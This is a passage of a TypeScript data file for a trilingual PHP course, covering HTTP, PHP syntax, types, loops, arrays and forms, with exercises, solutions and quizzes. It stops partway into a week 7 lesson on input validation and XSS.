/**
 * CME228 Web Programming (PHP), 14 weeks: HTTP, PHP basics, forms, sessions, files, MySQL with PDO,
 * object oriented PHP, security and JSON APIs. Every PHP output was checked with PHP 8.2.
 * Weeks 1–7 prepare the midterm, weeks 8–14 the final.
 * Weeks 2, 5 and 6 keep the ids of the former 3-lesson course.
 */

import type { LessonSource } from '@/data/lessons';

export const cme228Lessons: LessonSource[] = [
  {
    id: 'php-w01-web-http',
    week: 1,
    title: {
      fr: 'Comment fonctionne le web : client, serveur et HTTP',
      en: 'How the web works: client, server and HTTP',
      tr: 'Web nasıl çalışır: istemci, sunucu ve HTTP',
    },
    blocks: [
      {
        type: 'text',
        text: {
          fr: 'Le navigateur (client) envoie une requête HTTP à un serveur web (Apache, Nginx). Pour une page .html, le serveur renvoie le fichier tel quel. Pour une page .php, il l’exécute d’abord : PHP produit du HTML, et c’est ce HTML que reçoit le navigateur. Le code PHP n’est donc jamais visible par le visiteur. HTML décrit le contenu, CSS la présentation, JavaScript le comportement côté client.',
          en: 'The browser (client) sends an HTTP request to a web server (Apache, Nginx). For an .html page, the server returns the file as is. For a .php page, it runs it first: PHP produces HTML, and that HTML is what the browser receives. So the PHP code is never visible to the visitor. HTML describes content, CSS presentation, JavaScript client-side behavior.',
          tr: 'Tarayıcı (istemci) bir web sunucusuna (Apache, Nginx) HTTP isteği gönderir. .html sayfası için sunucu dosyayı olduğu gibi döndürür. .php sayfası için önce onu çalıştırır: PHP HTML üretir ve tarayıcı bu HTML’i alır. Bu yüzden PHP kodu ziyaretçiye asla görünmez. HTML içeriği, CSS sunumu, JavaScript istemci tarafındaki davranışı tanımlar.',
        },
      },
      {
        type: 'code',
        code: {
          fr: 'Requête                         Réponse\nGET /notes.php?id=3 HTTP/1.1    HTTP/1.1 200 OK\nHost: kbu.edu.tr                Content-Type: text/html\n                                <html>…</html>\n\nMéthodes : GET (lire), POST (envoyer des données), PUT, DELETE\nCodes d’état :\n200 OK   301 redirection   404 introuvable   403 interdit\n500 erreur du serveur\nHTTP est sans état : le serveur ne se souvient pas des requêtes\nprécédentes (d’où les cookies et sessions, semaine 8).',
          en: 'Request                         Response\nGET /notes.php?id=3 HTTP/1.1    HTTP/1.1 200 OK\nHost: kbu.edu.tr                Content-Type: text/html\n                                <html>…</html>\n\nMethods: GET (read), POST (send data), PUT, DELETE\nStatus codes:\n200 OK   301 redirect   404 not found   403 forbidden\n500 server error\nHTTP is stateless: the server doesn’t remember previous\nrequests (hence cookies and sessions, week 8).',
          tr: 'İstek                           Yanıt\nGET /notes.php?id=3 HTTP/1.1    HTTP/1.1 200 OK\nHost: kbu.edu.tr                Content-Type: text/html\n                                <html>…</html>\n\nYöntemler: GET (okuma), POST (veri gönderme), PUT, DELETE\nDurum kodları:\n200 OK   301 yönlendirme   404 bulunamadı   403 yasak\n500 sunucu hatası\nHTTP durumsuzdur: sunucu önceki istekleri hatırlamaz\n(çerezler ve oturumlar bu yüzden var, 8. hafta).',
        },
      },
      {
        type: 'exercise',
        question: {
          fr: 'Un étudiant ouvre http://localhost/info.php, qui contient <?php echo 2 + 3; ?>. (1) Qui exécute le calcul ? (2) Que voit-il avec « Afficher le code source » ? (3) Quel code d’état reçoit-il si le fichier n’existe pas ? (4) Et si le PHP contient une erreur fatale ?',
          en: 'A student opens http://localhost/info.php, which contains <?php echo 2 + 3; ?>. (1) Who runs the computation? (2) What do they see with “View page source”? (3) Which status code do they get if the file doesn’t exist? (4) And if the PHP has a fatal error?',
          tr: 'Bir öğrenci <?php echo 2 + 3; ?> içeren http://localhost/info.php adresini açıyor. (1) Hesabı kim yapar? (2) “Sayfa kaynağını görüntüle” ile ne görür? (3) Dosya yoksa hangi durum kodunu alır? (4) PHP’de ölümcül bir hata varsa?',
        },
        solution: {
          fr: '(1) Le serveur, avec l’interpréteur PHP, avant d’envoyer la réponse. (2) Seulement « 5 » : le code PHP ne quitte jamais le serveur. (3) 404 Not Found. (4) 500 Internal Server Error (ou le message d’erreur si l’affichage des erreurs est activé, ce qu’il faut éviter en production).',
          en: '(1) The server, with the PHP interpreter, before sending the response. (2) Only “5”: the PHP code never leaves the server. (3) 404 Not Found. (4) 500 Internal Server Error (or the error message if error display is on, which must be avoided in production).',
          tr: '(1) Sunucu, yanıtı göndermeden önce PHP yorumlayıcısıyla. (2) Yalnızca “5”: PHP kodu sunucudan asla çıkmaz. (3) 404 Not Found. (4) 500 Internal Server Error (ya da hata gösterimi açıksa hata mesajı; canlı ortamda bundan kaçınılmalıdır).',
        },
      },
    ],
    quiz: {
      question: {
        fr: 'Où s’exécute le code PHP ?',
        en: 'Where does PHP code run?',
        tr: 'PHP kodu nerede çalışır?',
      },
      options: { fr: ['Dans le navigateur', 'Sur le serveur', 'Dans la base de données'], en: ['In the browser', 'On the server', 'In the database'], tr: ['Tarayıcıda', 'Sunucuda', 'Veritabanında'] },
      answerIndex: 1,
      explanation: {
        fr: 'PHP est un langage côté serveur : le navigateur ne reçoit que le HTML produit. JavaScript, lui, s’exécute dans le navigateur.',
        en: 'PHP is a server-side language: the browser only gets the HTML produced. JavaScript, on the other hand, runs in the browser.',
        tr: 'PHP sunucu tarafı bir dildir: tarayıcı yalnızca üretilen HTML’i alır. JavaScript ise tarayıcıda çalışır.',
      },
    },
  },
  {
    id: 'php-first-script',
    week: 2,
    title: {
      fr: 'Premier script PHP et variables',
      en: 'First PHP script and variables',
      tr: 'İlk PHP betiği ve değişkenler',
    },
    blocks: [
      {
        type: 'text',
        text: {
          fr: 'Le code PHP s’écrit entre <?php et ?>, et peut être mélangé au HTML. Les variables commencent par $ et n’ont pas de type déclaré : PHP le déduit de la valeur. echo affiche du texte ; le point (.) concatène des chaînes. Entre guillemets doubles, les variables sont remplacées par leur valeur ; entre guillemets simples, non.',
          en: 'PHP code goes between <?php and ?>, and can be mixed with HTML. Variables start with $ and have no declared type: PHP infers it from the value. echo prints text; the dot (.) concatenates strings. Inside double quotes, variables are replaced by their value; inside single quotes, they are not.',
          tr: 'PHP kodu <?php ile ?> arasına yazılır ve HTML ile karıştırılabilir. Değişkenler $ ile başlar ve tipleri bildirilmez: PHP tipi değerden çıkarır. echo metin yazdırır; nokta (.) dizeleri birleştirir. Çift tırnak içinde değişkenler değerleriyle değiştirilir; tek tırnak içinde değiştirilmez.',
        },
      },
      {
        type: 'code',
        code: {
          fr: '<!DOCTYPE html>\n<html>\n<body>\n  <h1><?php echo "Bienvenue à la KBU"; ?></h1>\n  <?php\n    $nom = "Ali";\n    $annee = 2;\n    echo "<p>Bonjour $nom, tu es en $annee" . "e année.</p>";\n    echo \'<p>Bonjour $nom</p>\';        // affiche $nom tel quel\n  ?>\n  <p>Nous sommes le <?= date("d/m/Y") ?></p>   <!-- <?= = echo -->\n</body>\n</html>',
          en: '<!DOCTYPE html>\n<html>\n<body>\n  <h1><?php echo "Welcome to KBU"; ?></h1>\n  <?php\n    $name = "Ali";\n    $year = 2;\n    echo "<p>Hello $name, you are in year $year.</p>";\n    echo \'<p>Hello $name</p>\';        // prints $name literally\n  ?>\n  <p>Today is <?= date("d/m/Y") ?></p>   <!-- <?= = echo -->\n</body>\n</html>',
          tr: '<!DOCTYPE html>\n<html>\n<body>\n  <h1><?php echo "KBU’ya hoş geldiniz"; ?></h1>\n  <?php\n    $ad = "Ali";\n    $sinif = 2;\n    echo "<p>Merhaba $ad, $sinif. sınıftasın.</p>";\n    echo \'<p>Merhaba $ad</p>\';        // $ad’ı olduğu gibi yazar\n  ?>\n  <p>Bugün <?= date("d/m/Y") ?></p>   <!-- <?= = echo -->\n</body>\n</html>',
        },
      },
      {
        type: 'exercise',
        question: {
          fr: 'Qu’affiche ce code ? $a = 5; $b = "3"; echo $a + $b; echo " | "; echo $a . $b;',
          en: 'What does this code print? $a = 5; $b = "3"; echo $a + $b; echo " | "; echo $a . $b;',
          tr: 'Bu kod ne yazdırır? $a = 5; $b = "3"; echo $a + $b; echo " | "; echo $a . $b;',
        },
        solution: {
          fr: '« 8 | 53 ». Avec +, PHP convertit "3" en nombre et additionne : 8. Avec le point, il convertit 5 en texte et colle les deux chaînes : "53". En PHP, + sert toujours aux nombres et . toujours au texte (contrairement à JavaScript, où + fait les deux).',
          en: '“8 | 53”. With +, PHP converts "3" to a number and adds: 8. With the dot, it converts 5 to text and glues the strings: "53". In PHP, + is always for numbers and . always for text (unlike JavaScript, where + does both).',
          tr: '“8 | 53”. + ile PHP "3"ü sayıya çevirip toplar: 8. Nokta ile 5’i metne çevirip iki dizeyi yapıştırır: "53". PHP’de + her zaman sayılar, . her zaman metin içindir (+’nın ikisini de yaptığı JavaScript’in aksine).',
        },
      },
    ],
    quiz: {
      question: { fr: 'Qu’affiche ce code ?', en: 'What does this code print?', tr: 'Bu kod ne yazdırır?' },
      code: '$x = 10;\necho \'Total: $x\';',
      options: { fr: ['Total: 10', 'Total: $x', 'Une erreur'], en: ['Total: 10', 'Total: $x', 'An error'], tr: ['Total: 10', 'Total: $x', 'Bir hata'] },
      answerIndex: 1,
      explanation: {
        fr: 'Entre guillemets simples, PHP ne remplace pas les variables. Avec des guillemets doubles, on aurait « Total: 10 ».',
        en: 'Inside single quotes, PHP doesn’t replace variables. With double quotes, you would get “Total: 10”.',
        tr: 'Tek tırnak içinde PHP değişkenleri değiştirmez. Çift tırnakla “Total: 10” elde edilirdi.',
      },
    },
  },
  {
    id: 'php-w03-types-strings',
    week: 3,
    title: {
      fr: 'Types, opérateurs et chaînes de caractères',
      en: 'Types, operators and strings',
      tr: 'Tipler, işleçler ve karakter dizileri',
    },
    blocks: [
      {
        type: 'code',
        code: {
          fr: 'Types : int, float, string, bool, array, object, null\nvar_dump($x);        // affiche le type et la valeur\n\n==  égal après conversion       5 == "5"    → true\n=== égal ET même type           5 === "5"   → false\n??  valeur par défaut           $nom ?? "inconnu"\n<=> comparaison (−1, 0, 1)      7 <=> 3     → 1\nintdiv(17, 5) → 3     17 % 5 → 2\n\nstrlen("Karabük")      → 8   (octets : ü prend 2 octets en UTF-8)\nmb_strlen("Karabük")   → 7   (caractères)\nstrtoupper("kbu") → "KBU"     ucfirst("ali") → "Ali"\nsubstr("Karabuk", 0, 4) → "Kara"\nstr_replace("a", "4", "Karabuk") → "K4r4buk"',
          en: 'Types: int, float, string, bool, array, object, null\nvar_dump($x);        // shows type and value\n\n==  equal after conversion      5 == "5"    → true\n=== equal AND same type         5 === "5"   → false\n??  default value               $name ?? "unknown"\n<=> comparison (−1, 0, 1)       7 <=> 3     → 1\nintdiv(17, 5) → 3     17 % 5 → 2\n\nstrlen("Karabük")      → 8   (bytes: ü takes 2 bytes in UTF-8)\nmb_strlen("Karabük")   → 7   (characters)\nstrtoupper("kbu") → "KBU"     ucfirst("ali") → "Ali"\nsubstr("Karabuk", 0, 4) → "Kara"\nstr_replace("a", "4", "Karabuk") → "K4r4buk"',
          tr: 'Tipler: int, float, string, bool, array, object, null\nvar_dump($x);        // tipi ve değeri gösterir\n\n==  dönüşümden sonra eşit       5 == "5"    → true\n=== eşit VE aynı tip            5 === "5"   → false\n??  varsayılan değer            $ad ?? "bilinmiyor"\n<=> karşılaştırma (−1, 0, 1)    7 <=> 3     → 1\nintdiv(17, 5) → 3     17 % 5 → 2\n\nstrlen("Karabük")      → 8   (bayt: ü, UTF-8’de 2 bayttır)\nmb_strlen("Karabük")   → 7   (karakter)\nstrtoupper("kbu") → "KBU"     ucfirst("ali") → "Ali"\nsubstr("Karabuk", 0, 4) → "Kara"\nstr_replace("a", "4", "Karabuk") → "K4r4buk"',
        },
      },
      {
        type: 'text',
        text: {
          fr: 'Utilise === par défaut : == convertit les types et peut surprendre. Pour les textes en turc, en français ou en arabe, préfère les fonctions mb_ (mb_strlen, mb_substr, mb_strtoupper) qui comptent des caractères et non des octets.',
          en: 'Use === by default: == converts types and can surprise you. For Turkish, French or Arabic text, prefer the mb_ functions (mb_strlen, mb_substr, mb_strtoupper), which count characters rather than bytes.',
          tr: 'Varsayılan olarak === kullan: == tipleri dönüştürür ve şaşırtabilir. Türkçe, Fransızca veya Arapça metinler için bayt değil karakter sayan mb_ fonksiyonlarını (mb_strlen, mb_substr, mb_strtoupper) tercih et.',
        },
      },
      {
        type: 'exercise',
        question: {
          fr: 'Donne le résultat de chaque expression en PHP 8 : (1) "10" + "5.5" ; (2) "5" * "4" ; (3) "abc" == 0 ; (4) null ?? "def" ; (5) 5 === "5".',
          en: 'Give the result of each expression in PHP 8: (1) "10" + "5.5"; (2) "5" * "4"; (3) "abc" == 0; (4) null ?? "def"; (5) 5 === "5".',
          tr: 'PHP 8’de her ifadenin sonucunu ver: (1) "10" + "5.5"; (2) "5" * "4"; (3) "abc" == 0; (4) null ?? "def"; (5) 5 === "5".',
        },
        solution: {
          fr: '(1) 15.5 (float) : les chaînes numériques sont converties. (2) 20 (int). (3) false : depuis PHP 8, une chaîne non numérique est comparée comme du texte (en PHP 7, c’était true, un piège célèbre). (4) "def" : ?? renvoie la droite quand la gauche est null. (5) false : même valeur, mais int et string sont deux types différents.',
          en: '(1) 15.5 (float): numeric strings are converted. (2) 20 (int). (3) false: since PHP 8, a non-numeric string is compared as text (in PHP 7 it was true, a famous trap). (4) "def": ?? returns the right side when the left is null. (5) false: same value, but int and string are different types.',
          tr: '(1) 15.5 (float): sayısal dizeler dönüştürülür. (2) 20 (int). (3) false: PHP 8’den beri sayısal olmayan dize metin olarak karşılaştırılır (PHP 7’de true idi, ünlü bir tuzak). (4) "def": sol taraf null olunca ?? sağ tarafı döndürür. (5) false: değer aynı ama int ve string farklı tiplerdir.',
        },
      },
    ],
    quiz: {
      question: {
        fr: 'Que renvoie strlen("Karabük") avec un texte en UTF-8 ?',
        en: 'What does strlen("Karabük") return with UTF-8 text?',
        tr: 'UTF-8 metinle strlen("Karabük") ne döndürür?',
      },
      options: { fr: ['7', '8', '6'], en: ['7', '8', '6'], tr: ['7', '8', '6'] },
      answerIndex: 1,
      explanation: {
        fr: 'strlen compte les octets, et « ü » en occupe 2 en UTF-8 : 8. mb_strlen compte les caractères : 7.',
        en: 'strlen counts bytes, and “ü” takes 2 in UTF-8: 8. mb_strlen counts characters: 7.',
        tr: 'strlen bayt sayar ve “ü” UTF-8’de 2 bayt kaplar: 8. mb_strlen karakter sayar: 7.',
      },
    },
  },
  {
    id: 'php-w04-control-functions',
    week: 4,
    title: {
      fr: 'Conditions, boucles et fonctions',
      en: 'Conditions, loops and functions',
      tr: 'Koşullar, döngüler ve fonksiyonlar',
    },
    blocks: [
      {
        type: 'code',
        code: {
          fr: 'if ($note >= 85) { $lettre = "AA"; }\nelseif ($note >= 60) { $lettre = "CC"; }\nelse { $lettre = "FF"; }\n\n$msg = match (true) { $note >= 50 => "réussi", default => "échoué" };\n\nfor ($i = 1; $i <= 10; $i++) {\n    if ($i % 3 == 0) continue;     // saute 3, 6, 9\n    if ($i > 7) break;             // s’arrête à 8\n    echo $i;\n}\n\nfunction puissance(int $x, int $y = 2): int {   // $y a une valeur par défaut\n    return $x ** $y;\n}\nfunction compteur() { static $c = 0; return ++$c; }   // garde sa valeur',
          en: 'if ($grade >= 85) { $letter = "AA"; }\nelseif ($grade >= 60) { $letter = "CC"; }\nelse { $letter = "FF"; }\n\n$msg = match (true) { $grade >= 50 => "passed", default => "failed" };\n\nfor ($i = 1; $i <= 10; $i++) {\n    if ($i % 3 == 0) continue;     // skips 3, 6, 9\n    if ($i > 7) break;             // stops at 8\n    echo $i;\n}\n\nfunction power(int $x, int $y = 2): int {      // $y has a default value\n    return $x ** $y;\n}\nfunction counter() { static $c = 0; return ++$c; }    // keeps its value',
          tr: 'if ($not >= 85) { $harf = "AA"; }\nelseif ($not >= 60) { $harf = "CC"; }\nelse { $harf = "FF"; }\n\n$mesaj = match (true) { $not >= 50 => "geçti", default => "kaldı" };\n\nfor ($i = 1; $i <= 10; $i++) {\n    if ($i % 3 == 0) continue;     // 3, 6, 9’u atlar\n    if ($i > 7) break;             // 8’de durur\n    echo $i;\n}\n\nfunction us(int $x, int $y = 2): int {         // $y’nin varsayılan değeri var\n    return $x ** $y;\n}\nfunction sayac() { static $c = 0; return ++$c; }      // değerini korur',
        },
      },
      {
        type: 'text',
        text: {
          fr: 'Portée des variables : une fonction ne voit pas les variables définies en dehors d’elle (sauf avec global, à éviter : on passe plutôt des paramètres). Une variable static garde sa valeur d’un appel à l’autre.',
          en: 'Variable scope: a function doesn’t see variables defined outside it (except with global, best avoided: pass parameters instead). A static variable keeps its value from one call to the next.',
          tr: 'Değişken kapsamı: bir fonksiyon dışında tanımlanan değişkenleri görmez (global hariç, kaçınılmalıdır: bunun yerine parametre verilir). static bir değişken değerini bir çağrıdan diğerine korur.',
        },
      },
      {
        type: 'exercise',
        question: {
          fr: '(1) Qu’affiche la boucle for ci-dessus ? (2) Que valent puissance(3) et puissance(2, 5) ? (3) On appelle compteur() trois fois : que renvoie le 3e appel ? (4) $n = 10; function g() { return isset($n) ? $n : "undefined"; } echo g(); affiche quoi ?',
          en: '(1) What does the for loop above print? (2) What are power(3) and power(2, 5)? (3) counter() is called three times: what does the 3rd call return? (4) $n = 10; function g() { return isset($n) ? $n : "undefined"; } echo g(); prints what?',
          tr: '(1) Yukarıdaki for döngüsü ne yazdırır? (2) us(3) ve us(2, 5) kaçtır? (3) sayac() üç kez çağrılıyor: 3. çağrı ne döndürür? (4) $n = 10; function g() { return isset($n) ? $n : "undefined"; } echo g(); ne yazdırır?',
        },
        solution: {
          fr: '(1) 12457 : 3 et 6 sont sautés, 7 est affiché, puis à 8 le break arrête la boucle (9 et 10 ne sont jamais atteints). (2) 3² = 9 et 2⁵ = 32. (3) 3 : $c est static, il passe à 1, 2, puis 3. (4) « undefined » : le $n de l’extérieur n’est pas visible dans g().',
          en: '(1) 12457: 3 and 6 are skipped, 7 is printed, then at 8 break ends the loop (9 and 10 are never reached). (2) 3² = 9 and 2⁵ = 32. (3) 3: $c is static, it goes 1, 2, then 3. (4) “undefined”: the outer $n isn’t visible inside g().',
          tr: '(1) 12457: 3 ve 6 atlanır, 7 yazdırılır, sonra 8’de break döngüyü bitirir (9 ve 10’a hiç ulaşılmaz). (2) 3² = 9 ve 2⁵ = 32. (3) 3: $c static’tir, 1, 2, sonra 3 olur. (4) “undefined”: dıştaki $n, g() içinde görünmez.',
        },
      },
    ],
    quiz: {
      question: {
        fr: 'Que fait continue dans une boucle ?',
        en: 'What does continue do in a loop?',
        tr: 'Döngüde continue ne yapar?',
      },
      options: {
        fr: ['Il arrête la boucle', 'Il passe directement au tour suivant', 'Il recommence la boucle depuis le début'],
        en: ['It stops the loop', 'It jumps straight to the next iteration', 'It restarts the loop from the beginning'],
        tr: ['Döngüyü durdurur', 'Doğrudan sonraki tura geçer', 'Döngüyü baştan başlatır'],
      },
      answerIndex: 1,
      explanation: {
        fr: 'continue saute la fin du tour actuel et passe au suivant ; break, lui, sort complètement de la boucle.',
        en: 'continue skips the rest of the current iteration and moves to the next; break leaves the loop entirely.',
        tr: 'continue o anki turun geri kalanını atlar ve sonrakine geçer; break ise döngüden tamamen çıkar.',
      },
    },
  },
  {
    id: 'php-arrays-loops',
    week: 5,
    title: { fr: 'Les tableaux et foreach', en: 'Arrays and foreach', tr: 'Diziler ve foreach' },
    blocks: [
      {
        type: 'text',
        text: {
          fr: 'Un tableau PHP peut être indexé (clés 0, 1, 2…) ou associatif (clés de texte : \'Ali\' => 85). On le parcourt avec foreach. PHP fournit beaucoup de fonctions : count, array_sum, sort (tri des valeurs), asort / arsort (tri en gardant les clés), ksort (tri par clé), array_filter, array_map, in_array, implode / explode.',
          en: 'A PHP array can be indexed (keys 0, 1, 2…) or associative (text keys: \'Ali\' => 85). It is walked with foreach. PHP offers many functions: count, array_sum, sort (sort values), asort / arsort (sort keeping keys), ksort (sort by key), array_filter, array_map, in_array, implode / explode.',
          tr: 'PHP dizisi indisli (0, 1, 2… anahtarları) veya ilişkisel (metin anahtarları: \'Ali\' => 85) olabilir. foreach ile dolaşılır. PHP birçok fonksiyon sunar: count, array_sum, sort (değerleri sıralar), asort / arsort (anahtarları koruyarak sıralar), ksort (anahtara göre), array_filter, array_map, in_array, implode / explode.',
        },
      },
      {
        type: 'code',
        code: {
          fr: '$villes = ["Karabuk", "Ankara", "Istanbul"];\n$villes[] = "Bursa";                   // ajoute à la fin\necho count($villes);                   // 4\n\n$notes = ["Ali" => 85, "Ayse" => 90, "Emre" => 55, "Zeynep" => 60];\nforeach ($notes as $nom => $note) {\n    echo "$nom : $note<br>";\n}\n$moyenne = array_sum($notes) / count($notes);\narsort($notes);                        // décroissant, garde les clés\n$admis = array_filter($notes, fn($n) => $n >= 60);\necho implode(", ", array_keys($admis));',
          en: '$cities = ["Karabuk", "Ankara", "Istanbul"];\n$cities[] = "Bursa";                   // appends\necho count($cities);                   // 4\n\n$grades = ["Ali" => 85, "Ayse" => 90, "Emre" => 55, "Zeynep" => 60];\nforeach ($grades as $name => $grade) {\n    echo "$name: $grade<br>";\n}\n$average = array_sum($grades) / count($grades);\narsort($grades);                       // descending, keeps keys\n$passed = array_filter($grades, fn($g) => $g >= 60);\necho implode(", ", array_keys($passed));',
          tr: '$sehirler = ["Karabuk", "Ankara", "Istanbul"];\n$sehirler[] = "Bursa";                 // sona ekler\necho count($sehirler);                 // 4\n\n$notlar = ["Ali" => 85, "Ayse" => 90, "Emre" => 55, "Zeynep" => 60];\nforeach ($notlar as $ad => $not) {\n    echo "$ad: $not<br>";\n}\n$ortalama = array_sum($notlar) / count($notlar);\narsort($notlar);                       // azalan, anahtarları korur\n$gecenler = array_filter($notlar, fn($n) => $n >= 60);\necho implode(", ", array_keys($gecenler));',
        },
      },
      {
        type: 'exercise',
        question: {
          fr: 'Avec ce code : (1) que vaut la moyenne ? (2) Dans quel ordre sont les élèves après arsort ? (3) Qu’affiche la dernière ligne ? (4) Que se passerait-il avec sort au lieu de arsort ?',
          en: 'With this code: (1) what is the average? (2) In which order are the students after arsort? (3) What does the last line print? (4) What would happen with sort instead of arsort?',
          tr: 'Bu kodla: (1) ortalama kaçtır? (2) arsort’tan sonra öğrenciler hangi sıradadır? (3) Son satır ne yazdırır? (4) arsort yerine sort kullanılsaydı ne olurdu?',
        },
        solution: {
          fr: '(1) (85 + 90 + 55 + 60) / 4 = 290 / 4 = 72.5. (2) Ayse 90, Ali 85, Zeynep 60, Emre 55. (3) array_filter garde les notes ≥ 60 dans l’ordre trié : « Ayse, Ali, Zeynep ». (4) sort trie les valeurs mais remplace les clés par 0, 1, 2, 3 : on perdrait les noms des élèves.',
          en: '(1) (85 + 90 + 55 + 60) / 4 = 290 / 4 = 72.5. (2) Ayse 90, Ali 85, Zeynep 60, Emre 55. (3) array_filter keeps grades ≥ 60 in sorted order: “Ayse, Ali, Zeynep”. (4) sort sorts the values but replaces the keys with 0, 1, 2, 3: the students’ names would be lost.',
          tr: '(1) (85 + 90 + 55 + 60) / 4 = 290 / 4 = 72.5. (2) Ayşe 90, Ali 85, Zeynep 60, Emre 55. (3) array_filter ≥ 60 olan notları sıralı düzende tutar: “Ayse, Ali, Zeynep”. (4) sort değerleri sıralar ama anahtarları 0, 1, 2, 3 ile değiştirir: öğrencilerin adları kaybolurdu.',
        },
      },
    ],
    quiz: {
      question: { fr: 'Qu’affiche ce code ?', en: 'What does this code print?', tr: 'Bu kod ne yazdırır?' },
      code: '$t = [3, 1, 2];\nsort($t);\necho implode(",", $t);',
      options: { fr: ['3,1,2', '1,2,3', '3,2,1'], en: ['3,1,2', '1,2,3', '3,2,1'], tr: ['3,1,2', '1,2,3', '3,2,1'] },
      answerIndex: 1,
      explanation: {
        fr: 'sort trie le tableau sur place, dans l’ordre croissant ; implode colle les éléments avec la virgule.',
        en: 'sort sorts the array in place, in ascending order; implode glues the elements with the comma.',
        tr: 'sort diziyi yerinde, artan sırayla sıralar; implode elemanları virgülle birleştirir.',
      },
    },
  },
  {
    id: 'php-forms',
    week: 6,
    title: { fr: 'Les formulaires : GET et POST', en: 'Forms: GET and POST', tr: 'Formlar: GET ve POST' },
    blocks: [
      {
        type: 'text',
        text: {
          fr: 'Un formulaire HTML envoie ses champs au script indiqué par action. Avec method="get", les données apparaissent dans l’URL (?nom=Ali&age=20) et arrivent dans $_GET : pratique pour une recherche, qu’on peut partager. Avec method="post", elles voyagent dans le corps de la requête et arrivent dans $_POST : à utiliser pour les mots de passe et pour tout ce qui modifie des données. Les valeurs reçues sont toujours des chaînes.',
          en: 'An HTML form sends its fields to the script named in action. With method="get", the data shows in the URL (?name=Ali&age=20) and arrives in $_GET: handy for a search that can be shared. With method="post", it travels in the request body and arrives in $_POST: use it for passwords and for anything that changes data. Received values are always strings.',
          tr: 'Bir HTML formu alanlarını action’da belirtilen betiğe gönderir. method="get" ile veriler URL’de görünür (?ad=Ali&yas=20) ve $_GET’e gelir: paylaşılabilen bir arama için kullanışlıdır. method="post" ile istek gövdesinde taşınır ve $_POST’a gelir: parolalar ve veri değiştiren her şey için kullanılmalıdır. Gelen değerler her zaman dizedir.',
        },
      },
      {
        type: 'code',
        code: {
          fr: '<form action="inscription.php" method="post">\n  <input type="text" name="nom">\n  <input type="number" name="age">\n  <select name="ville"><option>Karabuk</option><option>Ankara</option></select>\n  <button type="submit">Envoyer</button>\n</form>\n\n<?php // inscription.php\nif ($_SERVER["REQUEST_METHOD"] === "POST") {\n    $nom = trim($_POST["nom"] ?? "");\n    $age = (int) ($_POST["age"] ?? 0);\n    if ($nom === "") echo "Le nom est obligatoire";\n    else echo "Bienvenue " . htmlspecialchars($nom) . " ($age ans)";\n}',
          en: '<form action="register.php" method="post">\n  <input type="text" name="name">\n  <input type="number" name="age">\n  <select name="city"><option>Karabuk</option><option>Ankara</option></select>\n  <button type="submit">Send</button>\n</form>\n\n<?php // register.php\nif ($_SERVER["REQUEST_METHOD"] === "POST") {\n    $name = trim($_POST["name"] ?? "");\n    $age = (int) ($_POST["age"] ?? 0);\n    if ($name === "") echo "Name is required";\n    else echo "Welcome " . htmlspecialchars($name) . " ($age years old)";\n}',
          tr: '<form action="kayit.php" method="post">\n  <input type="text" name="ad">\n  <input type="number" name="yas">\n  <select name="sehir"><option>Karabuk</option><option>Ankara</option></select>\n  <button type="submit">Gönder</button>\n</form>\n\n<?php // kayit.php\nif ($_SERVER["REQUEST_METHOD"] === "POST") {\n    $ad = trim($_POST["ad"] ?? "");\n    $yas = (int) ($_POST["yas"] ?? 0);\n    if ($ad === "") echo "Ad zorunludur";\n    else echo "Hoş geldin " . htmlspecialchars($ad) . " ($yas yaşında)";\n}',
        },
      },
      {
        type: 'exercise',
        question: {
          fr: 'L’utilisateur ouvre recherche.php?q=php&page=2. (1) Que contiennent $_GET["q"] et $_GET["page"], et de quel type sont-ils ? (2) Que vaut $_GET["tri"] ?? "date" ? (3) Pourquoi un formulaire de connexion ne doit-il jamais utiliser GET ?',
          en: 'The user opens search.php?q=php&page=2. (1) What do $_GET["q"] and $_GET["page"] hold, and what type are they? (2) What is $_GET["sort"] ?? "date"? (3) Why must a login form never use GET?',
          tr: 'Kullanıcı ara.php?q=php&sayfa=2 adresini açıyor. (1) $_GET["q"] ve $_GET["sayfa"] neyi içerir, tipleri nedir? (2) $_GET["sirala"] ?? "tarih" kaçtır? (3) Giriş formu neden asla GET kullanmamalıdır?',
        },
        solution: {
          fr: '(1) "php" et "2", deux chaînes : il faut convertir la page avec (int) ou filter_var avant de calculer avec. (2) "date" : le paramètre tri n’existe pas, ?? évite l’avertissement « undefined index ». (3) Avec GET, le mot de passe apparaîtrait dans l’URL, donc dans l’historique du navigateur, les journaux du serveur et les liens partagés.',
          en: '(1) "php" and "2", both strings: convert page with (int) or filter_var before computing with it. (2) "date": the sort parameter doesn’t exist, ?? avoids the “undefined index” warning. (3) With GET, the password would show in the URL, so in browser history, server logs and shared links.',
          tr: '(1) "php" ve "2", ikisi de dize: hesap yapmadan önce sayfa (int) veya filter_var ile dönüştürülmelidir. (2) "tarih": sirala parametresi yoktur, ?? “undefined index” uyarısını önler. (3) GET ile parola URL’de, yani tarayıcı geçmişinde, sunucu kayıtlarında ve paylaşılan bağlantılarda görünürdü.',
        },
      },
    ],
    quiz: {
      question: {
        fr: 'Dans quel tableau arrivent les champs d’un formulaire envoyé avec method="post" ?',
        en: 'Which array receives the fields of a form sent with method="post"?',
        tr: 'method="post" ile gönderilen bir formun alanları hangi diziye gelir?',
      },
      options: { fr: ['$_GET', '$_POST', '$_SESSION'], en: ['$_GET', '$_POST', '$_SESSION'], tr: ['$_GET', '$_POST', '$_SESSION'] },
      answerIndex: 1,
      explanation: {
        fr: 'Les données envoyées en POST sont dans $_POST, avec pour clés les attributs name des champs.',
        en: 'Data sent with POST is in $_POST, keyed by the fields’ name attributes.',
        tr: 'POST ile gönderilen veriler, anahtarları alanların name öznitelikleri olan $_POST’tadır.',
      },
    },
  },
  {
    id: 'php-w07-validation',
    week: 7,
    title: {
      fr: 'Valider les données, éviter le XSS et révision de la vize',
      en: 'Validating input, preventing XSS and midterm review',
      tr: 'Girdi doğrulama, XSS’i önleme ve vize tekrarı',
    },
    blocks: [
      {
        type: 'text',
        text: {
          fr: 'Règle d’or : ne jamais faire confiance aux données envoyées par l’utilisateur. On les valide (le format est-il correct ?) avec filter_var, et on les échappe au moment de les afficher avec htmlspecialchars. Sinon, un visiteur peut injecter du JavaScript dans la page des autres : c’est une faille XSS (Cross-Site Scripting). La validation en JavaScript ou en HTML (required, type="email") aide l’utilisateur mais ne protège pas : elle se contourne facilement.',
